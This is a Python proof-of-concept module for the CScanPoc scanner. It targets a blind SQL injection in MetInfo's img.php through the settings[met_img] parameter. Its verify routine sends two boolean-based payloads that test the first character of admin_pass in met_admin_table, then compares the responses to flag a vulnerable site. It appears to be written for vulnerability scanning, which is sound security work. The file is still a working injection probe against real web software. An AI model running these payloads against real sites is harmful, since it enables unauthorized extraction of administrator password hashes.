# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'MetInfo_0024' # 平台漏洞编号，留空
    name = 'MetInfo SQL盲注，可盲注管理员信息。' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-02-03'  # 漏洞公布时间
    desc = '''
        漏洞出现在 D:\wamp\www\MetInfo5.2\img\img.php
        第7行$dbname可以覆盖此变量，最终造成注入漏洞。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/1230/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '555f3f8b-5132-4dc5-8909-92367bba25cd'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #返回空白
            payload1 = '/case/?settings[met_img]=met_admin_table where substr(left((admin_pass),32),1,1)=char(56)-- 1'
            #返回案例
            payload2 = '/case/?settings[met_img]=met_admin_table where substr(left((admin_pass),32),1,1)=char(55)-- 1'
            url1 = self.target + payload1
            url2 = self.target + payload2
            r1 = requests.get(url1)
            r2 = requests.get(url2)

            if r1.text != r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()